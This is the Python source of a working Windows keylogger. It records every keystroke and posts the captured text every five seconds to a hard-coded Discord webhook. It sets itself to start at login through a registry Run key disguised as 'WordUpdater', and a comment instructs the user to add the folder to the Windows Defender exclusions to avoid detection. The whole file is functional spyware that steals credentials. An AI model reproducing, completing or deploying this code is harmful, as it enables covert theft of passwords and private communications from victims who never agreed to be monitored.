import ctypes
import time
import requests
import sys
import os
import winreg
import win32event
import win32api
import winerror
import threading

# +++++++++++++++ IMPORTANT +++++++++++++++++++++++++++=
# Download the file in zip format
# Then extract it and add rename the folder to anything
# in windows search bar -> defender -> virus threat protection -> Virus and thread protection settings (manage settings) -> Exclusions (add the extracted folder ) -> then ./build.bat

# === Prevent multiple instances using a named mutex ===
mutex = win32event.CreateMutex(None, False, "Global\\WordUpdaterMutex")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    sys.exit(0)  # Exit if already running

# === Auto-start at Windows login using registry ===
def add_to_startup():
    exe_path = sys.executable
    key = winreg.HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "WordUpdater"
    try:
        registry_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        registry_key = winreg.CreateKey(key, reg_path)
    winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(registry_key)

add_to_startup()

# functionality
user32 = ctypes.windll.user32
webhook_url = 'https://discord.com/api/webhooks/1367536389909905540/aSuRIYgRe9s8N8CStcgxhw1s-bg__uTeKAKuGHZoTDJynLAfSufQMACssxm8WNeV37ZP'  # Replace this with your actual url

def getKey(code):
    asciiTable = {
        "8": "[BACKSPACE]", "9": "[TAB]", "13": "[ENTER]",
        "16": "[SHIFT]", "17": "[CTRL]", "18": "[ALT]",
        "20": "[CAPSLOCK]", "27": "[ESC]", "32": " ",
        "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
        "48": "0", "49": "1", "50": "2", "51": "3", "52": "4",
        "53": "5", "54": "6", "55": "7", "56": "8", "57": "9",
        "65": "A", "66": "B", "67": "C", "68": "D", "69": "E",
        "70": "F", "71": "G", "72": "H", "73": "I", "74": "J",
        "75": "K", "76": "L", "77": "M", "78": "N", "79": "O",
        "80": "P", "81": "Q", "82": "R", "83": "S", "84": "T",
        "85": "U", "86": "V", "87": "W", "88": "X", "89": "Y",
        "90": "Z", "186": ";", "187": "=", "188": ",", "189": "-",
        "190": ".", "191": "/", "192": "`", "219": "[", "220": "\\",
        "221": "]", "222": "'"
    }
    return asciiTable.get(code, "")

# Shared buffers and lock
buffer_a = []
buffer_b = []
active_buffer = buffer_a
buffer_lock = threading.Lock()
pressed_keys = set()

def switch_and_send():
    global active_buffer
    while True:
        time.sleep(5)
        with buffer_lock:
            to_send = active_buffer.copy()
            active_buffer.clear()
            active_buffer = buffer_b if active_buffer is buffer_a else buffer_a
        if to_send:
            try:
                message = ''.join(to_send)
                requests.post(webhook_url, json={"content": message})
            except:
                pass

def keylogger():
    global active_buffer
    while True:
        for i in range(256):
            key_state = user32.GetAsyncKeyState(i)
            if key_state & 0x8000:
                if i not in pressed_keys:
                    key = getKey(str(i))
                    if user32.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()
                    if key:
                        with buffer_lock:
                            active_buffer.append(key)
                    pressed_keys.add(i)
            else:
                if i in pressed_keys:
                    pressed_keys.remove(i)
        time.sleep(0.01)

if __name__ == "__main__":
    threading.Thread(target=switch_and_send, daemon=True).start()
    keylogger()
